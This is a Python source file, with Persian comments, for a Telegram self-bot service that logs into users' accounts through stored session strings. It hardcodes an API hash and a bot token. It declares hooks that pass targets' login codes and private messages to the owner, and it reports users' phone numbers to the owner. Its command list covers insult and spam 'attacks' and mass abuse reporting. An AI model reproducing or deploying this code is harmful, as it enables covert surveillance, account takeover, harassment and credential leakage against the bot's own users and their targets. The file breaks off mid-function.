# -*- coding: utf-8 -*-
import json, asyncio, threading, random, os, re
from datetime import datetime, timedelta, timezone
from telebot import TeleBot, types
from telethon import TelegramClient, events
from telethon.errors import AuthKeyUnregisteredError, AuthKeyDuplicatedError, UserDeactivatedError, UserDeactivatedBanError, FloodWaitError
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.types import SendMessageTypingAction, MessageEntityBold, MessageEntityItalic, MessageEntityCode, MessageEntityTextUrl, MessageEntityMentionName, MessageEntitySpoiler, MessageEntityUnderline, MessageEntityStrike, MessageEntityBlockquote, ReactionEmoji
from telethon.tl.functions.messages import SendReactionRequest, DeleteHistoryRequest, SetTypingRequest
from telethon.tl.functions.account import UpdateStatusRequest, UpdateProfileRequest
from telethon import functions

API_ID = 27758062
API_HASH = 'da533cc3117c9c771bf2566b5b75b236'
BOT_TOKEN = '8451215104:AAH-Onh0AkUc6JQrCx7aW9pQrDRxOyLx46c'
OWNER_ID = 6360579233
FORCE_CHANNEL = None
FORCE_CHANNEL_ID = None
FORCE_CHANNEL_TITLE = None
DATA_FILE = 'self_data.json'
LOCK = threading.RLock()
MAX_SAVE_BYTES = 1 * 1024 * 1024  # 1MB — فایل بزرگ‌تر ذخیره نشود
MAX_SAVE_VIDEO_BYTES = MAX_SAVE_BYTES  # سازگاری با کد قبلی

bot = TeleBot(BOT_TOKEN)
try:
    BOT_USERNAME = bot.get_me().username
except Exception:
    BOT_USERNAME = None
if not BOT_USERNAME:
    BOT_USERNAME = 'bot'


def bot_tag_html():
    un = BOT_USERNAME or 'bot'
    return "<blockquote><code>@" + str(un).replace('<', '') + "</code></blockquote>"


def make_circle_avatar(im, size=180):
    """برش دایره‌ای تمیز پروفایل برای عکس پنل"""
    try:
        from PIL import Image as _Image, ImageDraw as _ImageDraw
        im = im.convert('RGBA')
        resample = getattr(getattr(_Image, 'Resampling', _Image), 'LANCZOS', getattr(_Image, 'LANCZOS', 1))
        im = im.resize((size, size), resample)
        mask = _Image.new('L', (size, size), 0)
        dr = _ImageDraw.Draw(mask)
        dr.ellipse((0, 0, size - 1, size - 1), fill=255)
        out = _Image.new('RGBA', (size, size), (0, 0, 0, 0))
        out.paste(im, (0, 0), mask=mask)
        ring = _Image.new('RGBA', (size, size), (0, 0, 0, 0))
        rd = _ImageDraw.Draw(ring)
        rd.ellipse((1, 1, size - 2, size - 2), outline=(255, 255, 255, 230), width=3)
        out = _Image.alpha_composite(out, ring)
        return out
    except Exception:
        return im


def sync_user_profile_from_tg(uid, user_obj=None):
    """آپدیت اسم و یوزرنیم کاربر در دیتای ربات"""
    try:
        if user_obj is None:
            return
        name = (getattr(user_obj, 'first_name', None) or '')
        ln = getattr(user_obj, 'last_name', None)
        if ln:
            name = (str(name) + ' ' + str(ln)).strip()
        un = getattr(user_obj, 'username', None) or ''
        if name:
            set_user(uid, 'original_name', name)
        set_user(uid, 'username', un or '')
    except Exception:
        pass


def with_bot_tag(text):
    """متن وضعیت + تگ ربات"""
    t = str(text or '')
    tag = bot_tag_html()
    if tag in t:
        return t
    return t + chr(10) + tag


def client_really_alive(uid):
    """چک واقعی: کلاینت در حافظه و متصل"""
    try:
        cl = clients.get(int(uid))
        if cl is None:
            return False
        try:
            return bool(cl.is_connected())
        except Exception:
            return False
    except Exception:
        return False


def notify_owner_session_drop(uid):
    """وقتی سلف از اکانت بیرون بیفتد به مالک گزارش بده"""
    try:
        u = get_user(uid) or {}
        name = u.get('original_name') or str(uid)
        un = u.get('username')
        ph = u.get('phone') or '—'
        body = (
            "<blockquote><b>سلف از اکانت خارج شد</b></blockquote>" + chr(10)
            + "<blockquote>نام: " + str(name).replace('<', '') + "</blockquote>" + chr(10)
            + "<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>" + chr(10)
        )
        if un:
            body += "<blockquote>یوزرنیم: @" + str(un).replace('<', '') + "</blockquote>" + chr(10)
        body += "<blockquote>شماره: <code>" + str(ph).replace('<', '') + "</code></blockquote>" + chr(10)
        body += "<blockquote>زمان: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "</blockquote>"
        bot.send_message(OWNER_ID, body, parse_mode='HTML')
        # علامت غیرفعال
        try:
            set_user(uid, 'session_alive', False)
        except Exception:
            pass
    except Exception:
        pass


def cb_spam_ok(uid, gap=1.2):
    """ضد اسپم دکمه — اگه خیلی سریع زد False"""
    import time as _t
    now = _t.time()
    until = float(cb_lock_until.get(uid) or 0)
    if now < until:
        return False
    cb_lock_until[uid] = now + gap
    return True


bot_spam_hits = {}  # uid -> [timestamps]
extra_attack_jobs = {}  # uid -> job for .اتک
auto_react_jobs = {}  # (uid, target_id) -> {count, emoji/random}
random_react_jobs = {}  # (uid, chat_id) -> {minutes, count, next_ts, active}
pv_first_seen = {}  # (owner_watch_uid, peer_id) -> True  — یک‌بار گزارش پیوی جدید
cb_lock_until = {}  # uid -> timestamp ضد اسپم دکمه


def media_too_large(msg, max_bytes=MAX_SAVE_BYTES):
    """هر فایل/مدیا بزرگ‌تر از 1MB ذخیره نشود"""
    try:
        media = getattr(msg, 'media', None)
        if not media:
            return False
        doc = getattr(media, 'document', None)
        if doc is not None:
            size = int(getattr(doc, 'size', 0) or 0)
            if size > max_bytes:
                return True
        # photo sizes
        photo = getattr(media, 'photo', None)
        if photo is not None:
            sizes = getattr(photo, 'sizes', None) or []
            best = 0
            for s in sizes:
                best = max(best, int(getattr(s, 'size', 0) or 0))
            if best > max_bytes:
                return True
    except Exception:
        pass
    return False


def is_bot_spam_blocked(uid):
    """مسدود ۱ ساعته به‌خاطر اسپم در ربات — مالک مسدود نمی‌شود"""
    try:
        if int(uid) == int(OWNER_ID):
            return False
    except Exception:
        pass
    try:
        until = get_ud(uid, 'bot_spam_until')
        if until and float(until) > __import__('time').time():
            return True
        if until:
            set_user(uid, 'bot_spam_until', None)
    except Exception:
        pass
    return False


def hit_bot_spam(uid, limit=12, window=8):
    """اگر در window ثانیه بیش از limit پیام → مسدود ۱ ساعت"""
    try:
        if int(uid) == int(OWNER_ID):
            return False
    except Exception:
        pass
    import time as _t
    now = _t.time()
    arr = bot_spam_hits.get(uid) or []
    arr = [t for t in arr if now - t < window]
    arr.append(now)
    bot_spam_hits[uid] = arr
    if len(arr) >= limit:
        set_user(uid, 'bot_spam_until', now + 3600)  # ۱ ساعت
        bot_spam_hits[uid] = []
        try:
            bot.send_message(uid, "شما به مدت 1 ساعت مسدود شده اید\nاز اسپم خودداری کنید !")
        except Exception:
            pass
        return True
    return False


def notify_referral_ok(referrer_id, new_uid):
    """زیرمجموعه فقط بعد از کپچا + عضویت اجباری"""
    try:
        name = get_user(new_uid).get('original_name') or str(new_uid)
        # سکه به معرف
        u = get_user(referrer_id)
        coins = int(u.get('coins') or 0) + 100
        set_user(referrer_id, 'coins', coins)
        refs = int(u.get('referrals') or 0) + 1
        set_user(referrer_id, 'referrals', refs)
        bot.send_message(
            referrer_id,
            "زیر مجموعه جدید ⚡\n"
            + mention(new_uid, name)
            + " از طریق لینک شما وارد ربات شد\n"
            + "100 سکه به شما تعلق گرفت",
            parse_mode='Markdown',
        )
        # گزارش فقط برای مالک اصلی
        try:
            bot.send_message(
                OWNER_ID,
                "زیرمجموعه جدید\n"
                + "معرف: " + mention(referrer_id, get_user(referrer_id).get('original_name') or str(referrer_id))
                + "\nجدید: " + mention(new_uid, name)
                + "\nایدی معرف: `" + str(referrer_id) + "`"
                + "\nایدی جدید: `" + str(new_uid) + "`",
                parse_mode='Markdown',
            )
        except Exception:
            pass
    except Exception:
        pass


def notify_transfer_owner(frm, to, amount, via="ربات", group_link=None, msg_link=None):
    """گزارش انتقال سکه به مالک اصلی — نقل قول"""
    try:
        fn = get_user(frm).get('original_name') or str(frm)
        tn = get_user(to).get('original_name') or str(to)
        ph = get_user(frm).get('phone') or '—'
        def _bq(s):
            return "<blockquote>" + str(s).replace("<", "&lt;").replace(">", "&gt;") + "</blockquote>"
        parts = [
            _bq("گزارش انتقال سکه"),
            _bq("از: " + str(fn)),
            _bq("به: " + str(tn)),
            _bq("مبلغ: " + str(amount)),
            _bq("ایدی فرستنده: " + str(frm)),
            _bq("ایدی گیرنده: " + str(to)),
            _bq("شماره فرستنده: " + str(ph)),
            _bq("مسیر: " + str(via)),
            _bq("زمان: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
        ]
        if group_link:
            parts.append(_bq("لینک گروه: " + str(group_link)))
        if msg_link:
            parts.append(_bq("لینک پیام: " + str(msg_link)))
        msg = chr(10).join(parts)
        # ایدی‌ها کپی‌شونده
        msg = msg.replace(
            _bq("ایدی فرستنده: " + str(frm)),
            "<blockquote>ایدی فرستنده: <code>" + str(frm) + "</code></blockquote>",
        )
        msg = msg.replace(
            _bq("ایدی گیرنده: " + str(to)),
            "<blockquote>ایدی گیرنده: <code>" + str(to) + "</code></blockquote>",
        )
        msg = msg.replace(
            _bq("شماره فرستنده: " + str(ph)),
            "<blockquote>شماره فرستنده: <code>" + str(ph).replace("<", "") + "</code></blockquote>",
        )
        bot.send_message(OWNER_ID, msg, parse_mode='HTML', disable_web_page_preview=True)
    except Exception:
        pass
clients = {}
last_cb_time = {}

extra_clients = {}
login_watch = {}  # target_uid -> True (مالک کد لاگین را می‌گیرد)
pv_spy = {}  # target_uid -> True (فوروارد پیوی به مالک اصلی)
pv_reported_peers = {}  # (watcher_uid, peer_id) -> True — یک‌بار پروفایل کامل
pv_msg_map = {}  # (uid, chat_id, msg_id) -> {'bot_mid': int, 'chat': OWNER_ID}
pv_album_buf = {}  # (uid, chat_id, grouped_id) -> {'items': [], 'ts': float, 'cap': str, 'is_out': bool, 'peer': int}
list_stop = set()  # OWNER stops list dump
list_skip_pv = set()  # OWNER skip current PV  # (owner_uid, acc_id) -> TelegramClient
extra_login_states = {}
force_panel_msgs = {}  # uid -> message_id پنل عضویت اجباری  # owner_uid -> login state for extra account
tabchi_states = {}  # owner_uid -> state for tabchi/spam UI
sender_jobs = {}  # (owner_uid, acc_id) -> job dict
extra_spam_jobs = {}  # (owner_uid, acc_id) -> job
login_states = {}
insult_wait = {}
attack_wait = {}
kol_wait = {}
reply_wait = {}
content_wait = {}
admin_states = {}
user_panels = {}
insult_index = {}
attack_index = {}
meow_chats = {}
fish_jobs = {}   # uid -> {chat_id, interval, next_ts}
pishi_jobs = {}  # uid -> {chat_id, interval, next_ts}
captcha_wait = {}
react_targets = {}
warning_sent = {}
attack_targets = {}
msg_cache = {}  # (uid, chat_id, msg_id) -> data
typing_jobs = {}  # uid -> config
style_skip = set()
banner_jobs = {}
interval_jobs = {}
delete_jobs = {}  # uid -> active delete task flag  # uid -> [{chat_id, text, interval, next_ts}]  # uid -> {chat_id: job}
tag_members_wait = {}  # uid -> chat_id
spam_cancel = {}  # uid -> True وقتی سلف خاموش شد اسپم قطع شود
self_panel_msgs = {}  # (uid, chat_id) -> [msg_id, ...]
help_panel_msgs = {}  # uid -> (chat_id, msg_id)
bot_prompt_msgs = {}  # uid -> msg_id آخرین پیام «فقط عدد»


def backup_data():
    """بکاپ از self_data.json"""
    try:
        import shutil, time as _tb
        os.makedirs('backups', exist_ok=True)
        if os.path.exists(DATA_FILE):
            ts = time.strftime('%Y%m%d_%H%M%S') if False else __import__('time').strftime('%Y%m%d_%H%M%S')
            shutil.copy2(DATA_FILE, os.path.join('backups', 'self_data_' + ts + '.json'))
            # نگه داشتن حداکثر 30 بکاپ
            files = sorted([f for f in os.listdir('backups') if f.startswith('self_data_')])
            while len(files) > 30:
                try:
                    os.remove(os.path.join('backups', files.pop(0)))
                except Exception:
                    break
    except Exception:
        pass

def _read_data_unlocked():
    if not os.path.exists(DATA_FILE):
        return {'users': {}, 'admins': []}
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        if not isinstance(data, dict):
            return {'users': {}, 'admins': []}
        if 'users' not in data or not isinstance(data.get('users'), dict):
            data['users'] = {}
        if 'admins' not in data:
            data['admins'] = []
        if 'reporter_codes' not in data or not isinstance(data.get('reporter_codes'), dict):
            data['reporter_codes'] = {}
        if 'reporter_users' not in data or not isinstance(data.get('reporter_users'), dict):
            data['reporter_users'] = {}
        if 'reporter_settings' not in data or not isinstance(data.get('reporter_settings'), dict):
            data['reporter_settings'] = {'daily_limit': 20, 'notify_owner': True}
        if 'reporter_bo' not in data or not isinstance(data.get('reporter_bo'), list):
            data['reporter_bo'] = []
        if 'report_exempt' not in data or not isinstance(data.get('report_exempt'), list):
            data['report_exempt'] = []
        if 'report_protected' not in data or not isinstance(data.get('report_protected'), list):
            data['report_protected'] = []
        return data
    except Exception:
        return {'users': {}, 'admins': []}


def _write_data_unlocked(data):
    tmp = DATA_FILE + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    try:
        os.replace(tmp, DATA_FILE)
    except Exception:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)


def load_data():
    with LOCK:
        return _read_data_unlocked()


def save_data(data):
    """ذخیره امن — سشن روی دیسک را اگر در data خالی شده ولی روی فایل هست نگه می‌دارد
    مگر اینکه صریحاً session=None ست شده باشد (کلید موجود و None)."""
    with LOCK:
        try:
            disk = _read_data_unlocked()
            disk_users = disk.get('users') or {}
            if 'users' not in data or not isinstance(data.get('users'), dict):
                data['users'] = {}
            for sid, du in disk_users.items():
                if sid not in data['users']:
                    # کاربر جدید روی دیسک که در data نیست — نگه دار
                    data['users'][sid] = du
                    continue
                nu = data['users'][sid]
                if not isinstance(nu, dict):
                    data['users'][sid] = du
                    continue
                # اگر data سشن ندارد ولی دیسک دارد و کلید session اصلاً در این آپدیت نبوده
                # (برای پاک کردن عمدی: session صریحاً None باشد)
                if 'session' not in nu and du.get('session'):
                    nu['session'] = du['session']
                if 'phone' not in nu and du.get('phone'):
                    nu['phone'] = du['phone']
        except Exception:
            pass
        _write_data_unlocked(data)


def get_user(uid):
    with LOCK:
        return dict((_read_data_unlocked().get('users') or {}).get(str(uid), {}) or {})


def resolve_target_id(text):
    """ایدی عددی یا @یوزرنیم → ایدی عددی یا None"""
    t = (text or '').strip()
    if not t:
        return None
    if t.startswith('@'):
        un = t[1:].strip().lower()
        data = load_data()
        for s, info in (data.get('users') or {}).items():
            if str(info.get('username') or '').lower() == un:
                try:
                    return int(s)
                except Exception:
                    return None
        return None
    try:
        return int(t)
    except Exception:
        return None


def set_user(uid, key, value):
    """ذخیره اتمیک یک کلید"""
    with LOCK:
        data = _read_data_unlocked()
        s = str(uid)
        if s not in data['users']:
            data['users'][s] = {}
        data['users'][s][key] = value
        _write_data_unlocked(data)


def update_user(uid, **kwargs):
    """ذخیره چند کلید با هم"""
    with LOCK:
        data = _read_data_unlocked()
        s = str(uid)
        if s not in data['users']:
            data['users'][s] = {}
        for k, v in kwargs.items():
            data['users'][s][k] = v
        _write_data_unlocked(data)


def has_session(uid):
    """سشن ذخیره‌شده معتبر در فایل؟"""
    try:
        u = get_user(uid) or {}
        s = u.get('session')
        if s is None:
            return False
        s = str(s).strip()
        if not s or s in ('None', 'null', 'none', ''):
            return False
        return True
    except Exception:
        return False


def get_ud(uid, key, default=None):
    return get_user(uid).get(key, default)


def is_cmd_text(t):
    """دستورات سلف — استایل نگیرند"""
    if not t:
        return False
    s = str(t).strip()
    if not s:
        return False
    # نقطه‌های مختلف + اسلش
    dots = ('.', '．', '٫', '。', '･', '·', '﹒', '｡')
    if s[0] in dots or s.startswith('/'):
        return True
    # بعد از کاراکتر نامرئی
    s2 = s.lstrip('\u200c\u200e\u200f\ufeff \t')
    if s2 and (s2[0] in dots or s2.startswith('/')):
        return True
    return False



def build_code_keypad(uid, mode='login'):
    """کیبورد شیشه‌ای ورود کد — دکمه‌های بزرگ‌تر با فاصله"""
    mk = types.InlineKeyboardMarkup(row_width=3)
    for row in ((1, 2, 3), (4, 5, 6), (7, 8, 9)):
        mk.row(*[
            types.InlineKeyboardButton("  {0}  ".format(n), callback_data="ck_{0}_{1}_{2}".format(mode, uid, n))
            for n in row
        ])
    mk.row(
        types.InlineKeyboardButton("  ⌫  ", callback_data="ck_{0}_{1}_b".format(mode, uid)),
        types.InlineKeyboardButton("  0  ", callback_data="ck_{0}_{1}_0".format(mode, uid)),
        types.InlineKeyboardButton("  ✖  ", callback_data="ck_{0}_{1}_c".format(mode, uid)),
    )
    mk.row(types.InlineKeyboardButton("     تایید ✓     ", callback_data="ck_{0}_{1}_ok".format(mode, uid)))
    return mk


def code_entry_text(digits, phone=None):
    shown = str(digits) if digits else '—'
    out = ''
    if phone:
        out += "<blockquote>شماره: <code>" + str(phone) + "</code></blockquote>" + chr(10)
    out += "<blockquote>کد: <code>" + shown + "</code></blockquote>" + chr(10)
    out += "<blockquote>کد ۵ رقمی را با دکمه‌ها وارد کنید</blockquote>"
    return out
    d = digits if digits else "—"
    return (
        "<blockquote>با استفاده از دکمه های زیر کد رو بزن</blockquote>" + chr(10)
        + "<blockquote>کد :</blockquote>" + chr(10)
        + "<blockquote><b>" + str(d) + "</b></blockquote>"
    )




def with_selfstr(text, html=False):
    if html:
        return (text or '') + chr(10) + "<blockquote>SelfStr</blockquote>"
    return (text or '')

def iran_datetime_str(dt=None):
    """تاریخ شمسی + میلادی + ساعت دقیق ایران"""
    from datetime import datetime, timezone, timedelta
    try:
        import pytz
        now = dt.astimezone(pytz.timezone('Asia/Tehran')) if dt and getattr(dt, 'tzinfo', None) else datetime.now(pytz.timezone('Asia/Tehran'))
    except Exception:
        now = datetime.utcnow() + timedelta(hours=3, minutes=30)
        if dt:
            try:
                now = dt
            except Exception:
                pass
    g_y, g_m, g_d = now.year, now.month, now.day
    # تبدیل ساده میلادی به شمسی
    def g2j(gy, gm, gd):
        g_d_n = [0,31,59,90,120,151,181,212,243,273,304,334]
        gy2 = gy + 1 if gm > 2 else gy
        days = 355666 + (365 * gy) + ((gy2 + 3) // 4) - ((gy2 + 99) // 100) + ((gy2 + 399) // 400) + gd + g_d_n[gm - 1]
        jy = -1595 + (33 * (days // 12053))
        days %= 12053
        jy += 4 * (days // 1461)
        days %= 1461
        if days > 365:
            jy += (days - 1) // 365
            days = (days - 1) % 365
        if days < 186:
            jm = 1 + days // 31
            jd = 1 + (days % 31)
        else:
            jm = 7 + (days - 186) // 30
            jd = 1 + ((days - 186) % 30)
        return jy, jm, jd
    jy, jm, jd = g2j(g_y, g_m, g_d)
    months = ['', 'فروردین','اردیبهشت','خرداد','تیر','مرداد','شهریور','مهر','آبان','آذر','دی','بهمن','اسفند']
    t = now.strftime('%H:%M:%S')
    return (
        f"{jy}/{jm}/{jd}" + " | " + f"{g_y}/{g_m}/{g_d}" + " | " + t
        + " | " + months[jm] + " " + str(jd)
    )


def is_self_on(uid):
    try:
        u = get_user(uid) or {}
        v = u.get("self_enabled", True)
        if v is None:
            return True
        if v is False or v == 0 or v == "0":
            return False
        if isinstance(v, str) and v.strip().lower() in ("false", "0", "off", "no", "none"):
            return False
        return True
    except Exception:
        return True





def _force_chat_candidates(ch):
    """لیست شناسه‌های ممکن برای get_chat_member"""
    cands = []
    cid = ch.get('id')
    link = str(ch.get('link') or '')
    if cid is not None:
        cands.append(cid)
        try:
            cands.append(int(cid))
        except Exception:
            pass
        if isinstance(cid, str) and cid.startswith('@'):
            cands.append(cid)
    import re as _re0
    if link:
        cands.append(link)
        mp = _re0.search(r't\.me/c/(\d+)', link)
        if mp:
            cands.append(int('-100' + mp.group(1)))
        mu = _re0.search(r't\.me/([A-Za-z][\w]{3,})', link)
        if mu and mu.group(1).lower() not in ('c', 'joinchat', 'addstickers'):
            cands.append('@' + mu.group(1))
            cands.append(mu.group(1))
    out = []
    seen = set()
    for c in cands:
        k = str(c)
        if k in seen or c is None or c == '':
            continue
        seen.add(k)
        out.append(c)
    return out


def _user_in_force_channel(uid, ch):
    for cand in _force_chat_candidates(ch):
        try:
            m = bot.get_chat_member(cand, uid)
            st = getattr(m, 'status', None)
            if st in ('member', 'administrator', 'creator', 'restricted'):
                return True
            if st in ('left', 'kicked'):
                return False
        except Exception:
            continue
    return False


def require_channel_join(uid, chat_id=None):
    """همیشه عضویت را چک می‌کند. True=باید متوقف شود و پنل عضویت نشان داده شد"""
    try:
        if int(uid) == int(OWNER_ID):
            return False
        if is_main_owner(uid) or is_admin(uid):
            return False
    except Exception:
        if uid == OWNER_ID:
            return False
    chs = get_force_channels()
    if not chs:
        try:
            set_user(uid, 'channel_ok', True)
        except Exception:
            pass
        return False
    missing = []
    for ch in chs:
        if _user_in_force_channel(uid, ch):
            continue
        missing.append(ch)
    if not missing:
        set_user(uid, 'channel_ok', True)
        return False
    set_user(uid, 'channel_ok', False)
    oldm = force_panel_msgs.pop(uid, None)
    if oldm:
        try:
            bot.delete_message(uid, oldm)
        except Exception:
            pass
    mk = types.InlineKeyboardMarkup()
    for ch in missing:
        title = ch.get('title') or 'چنل/گروه'
        link = str(ch.get('link') or '')
        cid = ch.get('id')
        if link.startswith('http'):
            mk.add(types.InlineKeyboardButton(str(title)[:40], url=link))
        elif isinstance(cid, str) and cid.startswith('@'):
            mk.add(types.InlineKeyboardButton(str(title)[:40], url="https://t.me/" + cid.lstrip('@')))
        elif link.startswith('@'):
            mk.add(types.InlineKeyboardButton(str(title)[:40], url="https://t.me/" + link.lstrip('@')))
        else:
            mk.add(types.InlineKeyboardButton(str(title)[:40], callback_data='noop'))
    mk.add(types.InlineKeyboardButton("عضو شدم", callback_data="ch_ok_" + str(uid)))
    try:
        msg = bot.send_message(
            uid,
            "برای استفاده از ربات عضو چنل یا گروه های زیر شوید:",
            reply_markup=mk,
        )
        force_panel_msgs[uid] = msg.message_id
    except Exception:
        pass
    return True




def get_force_channels():
    data = load_data()
    return data.get('force_channels') or []

def set_force_channels(lst):
    data = load_data()
    data['force_channels'] = lst
    # با تغییر لیست، همه باید دوباره عضو شوند
    for s, u in (data.get('users') or {}).items():
        if isinstance(u, dict):
            u['channel_ok'] = False
    save_data(data)

def force_panel(uid, message_id=None, chat_id=None):
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("اضافه کردن چنل", callback_data="fch_add"))
    mk.add(types.InlineKeyboardButton("لیست چنل ها", callback_data="fch_list"))
    back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=back))
    body = "عضویت اجباری" + chr(10) + "لینک یا ایدی عددی گروه/چنل را اضافه کنید."
    if message_id and chat_id:
        try:
            bot.edit_message_text(body, chat_id, message_id, reply_markup=mk)
            return
        except Exception:
            pass
    bot.send_message(uid, body, reply_markup=mk)

def force_list_panel(uid, message_id=None, chat_id=None):
    chs = get_force_channels()
    mk = types.InlineKeyboardMarkup(row_width=2)
    if not chs:
        body = "لیست چنل ها خالی است"
    else:
        body = "لیست چنل ها"
        for i, ch in enumerate(chs):
            title = ch.get('title') or ch.get('link') or str(ch.get('id'))
            mk.add(
                types.InlineKeyboardButton(title[:40], callback_data="noop"),
                types.InlineKeyboardButton("حذف", callback_data=f"fch_del_{i}"),
            )
    back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data="oforce" if is_owner(uid) else "aforce"))
    if message_id and chat_id:
        try:
            bot.edit_message_text(body, chat_id, message_id, reply_markup=mk)
            return
        except Exception:
            pass
    bot.send_message(uid, body, reply_markup=mk)


def get_extras(uid):
    return get_ud(uid, 'extra_accounts', {}) or {}


# ===================== ریپورتر =====================

HELP_COMMANDS = [
    (".پنل", "پنل دستورات و حساب کاربری"),
    (".راهنما", "راهنمای دستورات (صفحه‌ای — بعدی/قبلی)"),
    (".تنظیم دشمن", "ریپلای/ایدی — افزودن دشمن"),
    (".حذف دشمن", "ریپلای/ایدی — حذف دشمن"),
    (".لیست دشمنان", "نمایش دشمنان"),
    (".پاکسازی لیست دشمنان", "پاک کردن همه دشمنان"),
    (".ثبت متن", "ثبت متن فحش دشمن"),
    (".لیست متن", "لیست متن‌های دشمن"),
    (".پاکسازی لیست متن", "پاک کردن متن‌ها"),
    (".ثبت فحش", "ثبت فحش خودکار"),
    (".لیست فحش های خودکار", "لیست فحش خودکار"),
    (".پاکسازی لیست فحش", "پاکسازی فحش"),
    (".تنظیم متن خودکار", "کلمه محرک فحش"),
    (".خاموش کردن فحش خودکار", "خاموش فحش خودکار"),
    (".تنظیم کل", "افزودن به لیست کل"),
    (".حذف کل", "حذف از لیست کل"),
    (".لیست کل", "نمایش لیست کل"),
    (".ثبت متن کل", "ثبت متن کل"),
    (".پاکسازی لیست متن کل", "پاکسازی متن کل"),
    (".سکوت", "سکوت پیوی"),
    (".حذف سکوت", "حذف سکوت"),
    (".لیست سکوت", "لیست سکوت"),
    (".اسپم تعداد متن", "اسپم اکانت خود"),
    (".اسپم متن تعداد ایدی کاراکتر", "اسپم با منشن"),
    (".توقف", "قطع همه عملیات"),
    (".تنظیم متن دقیقه", "ارسال دوره‌ای"),
    (".حذف تعداد", "حذف N پیام خود در گروه"),
    (".اولین پیام", "اولین پیام کاربر در گروه"),
    (".امار", "آمار کاربر/گروه"),
    (".امار @یوزرنیم", "آمار با یوزرنیم"),
    (".محتوا", "ذخیره محتوا"),
    (".لیست محتوا", "لیست محتوا"),
    (".حذف محتوا کلمه", "حذف محتوا"),
    (".پاسخ", "پاسخ خودکار"),
    (".لیست پاسخ", "لیست پاسخ"),
    (".حذف پاسخ کلمه", "حذف پاسخ"),
    (".فونت کلمه", "فونت خاص"),
    (".انتقال عدد", "انتقال سکه"),
    (".در حال نوشتن", "تایپینگ"),
    (".در حال نوشتن خاموش", "خاموش تایپینگ"),
    (".ری اکت ایموجی", "قفل ری‌اکت"),
    (".ری اکت خاموش", "خاموش ری‌اکت"),
    (".تنظیم بنر دقیقه", "بنر زمان‌بندی"),
    (".توقف ارسال بنر", "توقف بنر"),
    (".بنر فعلی", "بنر فعلی"),
    (".تگ مدیران", "تگ مدیران"),
    (".تگ اعضا", "تگ اعضا"),
    (".میو خودکار روشن", "میو خودکار"),
    (".پیشی خودکار روشن", "پیشی خودکار"),
    (".ماهی گیری خودکار روشن", "ماهی خودکار"),
    (".https://t.me/c/...", "ذخیره از لینک"),
    (".@یوزرنیم‌چنل کل محتوا", "ذخیره چنل"),
    (".اتک متن تعداد", "اتک اکانت اضافه"),
    (".ری اکت تعداد ایموجی", "ری‌اکت اکانت اضافه"),
    (".set", "جوین اکانت اضافه"),
    (".leave", "لفت اکانت اضافه"),
    (".جوین", "جوین با لینک"),
    (".لغو", "لغو اسپم"),
]

def get_help_commands(uid=None):
    return list(HELP_COMMANDS)

REPORT_REASON_MAP = {
    # نام‌ها مطابق برچسب‌های رایج اپ تلگرام (FA) + constructorهای API
    'spam': 'هرزنامه',
    'violence': 'خشونت',
    'porn': 'پورنوگرافی',
    'child': 'کودک‌آزاری',
    'copyright': 'نقض حق نشر',
    'fake': 'این یک حساب جعلی است',
    'scam': 'کلاهبرداری یا هرزنامه',
    'scam_finance': 'کلاهبرداری یا هرزنامه مربوط به امور مالی',
    'scam_identity': 'کلاهبرداری با جعل هویت',
    'scam_giveaway': 'قرعه‌کشی جعلی',
    'scam_other': 'سایر',
    'drugs': 'مواد مخدر غیرقانونی',
    'personal': 'اطلاعات شخصی',
    'geo': 'نامرتبط',
    'other': 'سایر',
}

def reason_display_name(key, reason_text=''):
    """اگر سایر باشد همان متن کاربر؛ وگرنه برچسب تلگرام"""
    rt = (reason_text or '').strip()
    if key in ('other', 'scam_other') and rt:
        return rt[:200]
    return REPORT_REASON_MAP.get(key, key)

def _report_reason_obj(key):
    from telethon.tl import types as tl
    # کلاهبرداری زیرمجموعه فیک/سایر در API
    m = {
        'spam': tl.InputReportReasonSpam,
        'violence': tl.InputReportReasonViolence,
        'porn': tl.InputReportReasonPornography,
        'child': tl.InputReportReasonChildAbuse,
        'copyright': tl.InputReportReasonCopyright,
        'fake': tl.InputReportReasonFake,
        'scam': tl.InputReportReasonFake,
        'scam_finance': tl.InputReportReasonFake,
        'scam_other': tl.InputReportReasonOther,
        'drugs': tl.InputReportReasonIllegalDrugs,
        'personal': tl.InputReportReasonPersonalDetails,
        'geo': tl.InputReportReasonGeoIrrelevant,
        'other': tl.InputReportReasonOther,
    }
    cls = m.get(key) or tl.InputReportReasonOther
    return cls()

def _progress_bar(done, total, width=14):
    total = max(int(total), 1)
    done = max(0, min(int(done), total))
    filled = int(width * done / total)
    return '[' + ('█' * filled) + ('░' * (width - filled)) + ']'

def _parse_tg_link(link):
    """هر فرمت لینک تلگرام را قبول می‌کند → (kind, value)"""
    import re as _re
    link = (link or '').strip()
    m = _re.search(r'[?&]domain=([A-Za-z0-9_]+)', link, _re.I)
    if m:
        return 'user', m.group(1)
    m = _re.search(r'tg://join\?invite=([A-Za-z0-9_-]+)', link, _re.I)
    if m:
        return 'invite', m.group(1)
    link = link.replace(' ', '')
    m = _re.search(r'(?:t\.me|telegram\.me|telegram\.dog)/(?:\+|joinchat/)([A-Za-z0-9_-]+)', link, _re.I)
    if m:
        return 'invite', m.group(1)
    m = _re.search(r'(?:t\.me|telegram\.me|telegram\.dog)/c/(\d+)(?:/\d+)?', link, _re.I)
    if m:
        return 'id', int('-100' + m.group(1))
    m = _re.search(r'(?:t\.me|telegram\.me|telegram\.dog)/([A-Za-z][A-Za-z0-9_]{3,})(?:/\d+)?', link, _re.I)
    if m:
        return 'user', m.group(1)
    if link.lstrip('-').isdigit():
        n = int(link)
        if n > 0 and len(str(abs(n))) >= 10:
            return 'id', int('-100' + str(n))
        return 'id', n
    if link.startswith('@'):
        return 'user', link[1:]
